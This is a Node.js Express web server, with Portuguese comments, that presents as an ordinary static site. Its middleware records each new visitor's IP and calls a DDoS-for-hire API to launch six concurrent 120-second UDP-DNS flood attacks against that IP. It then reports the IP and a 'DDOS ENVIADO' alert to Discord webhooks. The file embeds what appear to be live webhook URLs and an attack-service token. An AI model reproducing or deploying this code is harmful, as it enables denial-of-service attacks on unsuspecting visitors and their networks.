const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const compression = require('compression');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const app = express();
const port = process.env.PORT || 4000;

const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
const configFile = path.join(__dirname, 'data', 'config.json');
const discordWebhookUrl = 'https://discord.com/api/webhooks/1271927639380328552/vINs9B4ZsbixDl4MzqVt2YWckm08VqdR-0osHOCPd25PqbePAOomq569Crl28yFP8acm'; // Substitua pelo URL correto do seu webhook
const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1271934485382041752/gS-cZhznQJKrs0zCzvkFeUhaMkNjV1eicrtFk8fllpe_julu_TNiGNaA9ZdwL-buoTck';
let lock = false;
let visitorsCache = [];
let configCache = { lastCleanup: new Date().toISOString() }; // Inicializa configCache para evitar erros

// Middleware de Compressão
app.use(compression());

// Middleware de Segurança
app.use(helmet());

// Limitação de Requisições
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100, // Limitar a 100 requisições por IP
});
app.use(limiter);

// Carregar cache dos arquivos na inicialização
async function loadCache() {
    try {
        const [visitorsData, configData] = await Promise.all([fs.readFile(visitorsFile), fs.readFile(configFile)]);
        visitorsCache = JSON.parse(visitorsData);
        configCache = JSON.parse(configData);
    } catch (err) {
        if (err.code === 'ENOENT') {
            if (!configCache) {
                configCache = { lastCleanup: new Date().toISOString() };
                await fs.writeFile(configFile, JSON.stringify(configCache, null, 2));
            }
        } else {
            console.error('Error loading cache:', err);
        }
    }
}

// Função para enviar requisição à API
async function sendApiRequest(ip) {
    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=120&method=UDP-DNS`;
    const requests = Array(6).fill(url).map(u => axios.get(u));
    
    try {
        await axios.all(requests);
        console.log(`Requisição enviada para o IP: ${ip}`);
    } catch (error) {
        console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
    }
}

async function verificar() {
    try {
      const response = await axios.get('https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff');
      const data = response.data;
  
      if (data.account.running > 0) {
            const url = "https://darlingapi.com/stop_all?token=af1f1818-3541-411f-a643-db88e2c575ff";
            await axios.get(url);
            console.log('Ataques anteriores interrompidos');
      }
    } catch (error) {
      console.error('Erro ao verificar o status dos ataques:', error);
    }
}

// Função para enviar webhooks ao Discord
async function sendDiscordWebhooks(ip, timestamp) {
    const webhook1 = axios.post(discordWebhookUrl, {
        embeds: [{
            title: 'Novo Visitante',
            description: `Um novo visitante acessou o site.`,
            color: 5814783,
            fields: [
                { name: 'IP', value: ip, inline: true },
                { name: 'Data e Hora', value: timestamp, inline: true }
            ],
            footer: { text: 'Visitante registrado' },
            timestamp: new Date()
        }]
    });

    const webhook2 = axios.post(discordWebhookUrl2, {
        embeds: [{
            title: 'DDOS ENVIADO',
            description: `Ataque enviado.`,
            color: 5814783,
            fields: [
                { name: 'IP', value: ip, inline: true },
                { name: 'Concurrents', value: '6', inline: true },
                { name: 'Time', value: '120', inline: true }
            ],
            timestamp: new Date()
        }]
    });

    try {
        await axios.all([webhook1, webhook2]);
    } catch (error) {
        console.error('Erro ao enviar webhooks:', error.message);
    }
}

// Função para limpar o arquivo de visitantes
async function cleanupVisitors() {
    try {
        const now = new Date();

        if (configCache && (now - new Date(configCache.lastCleanup)) >= 5 * 60 * 1000) {
            visitorsCache = [];
            await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
            console.log('Visitors file cleaned.');

            configCache.lastCleanup = now.toISOString();
            await fs.writeFile(configFile, JSON.stringify(configCache, null, 2));
            console.log('Config updated.');
        } else {
            console.log('No need for cleanup yet.');
        }
    } catch (err) {
        console.error('Error during cleanup:', err);
    }
}

setInterval(cleanupVisitors, 5 * 60 * 1000);
cleanupVisitors().catch(err => console.error('Error executing cleanup on startup:', err));

// Middleware para processar e registrar IPs apenas na página principal
app.use(async (req, res, next) => {
    if (req.path === '/admin') {
        return next();
    }

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (typeof ip === 'string') ip = ip.split(',')[0].trim();
    if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('::')) return next();

    let timestamp = new Date().toISOString();

    if (lock) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    lock = true;

    try {
        const ipEntry = visitorsCache.find(visitor => visitor.ip === ip);

        if (!ipEntry) {
            visitorsCache.push({ ip, timestamp });
            await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
            await verificar();
            await sendApiRequest(ip);
            await sendDiscordWebhooks(ip, timestamp);
        }
    } catch (err) {
        console.error('Error processing visitors:', err);
    } finally {
        lock = false;
    }

    next();
});

// Rota principal serve os arquivos estáticos e registra os IPs
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));

// Rota /admin não registra IPs
app.use('/admin', require('./routes/admin'));

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
    loadCache().catch(err => console.error('Error loading cache on startup:', err));
});
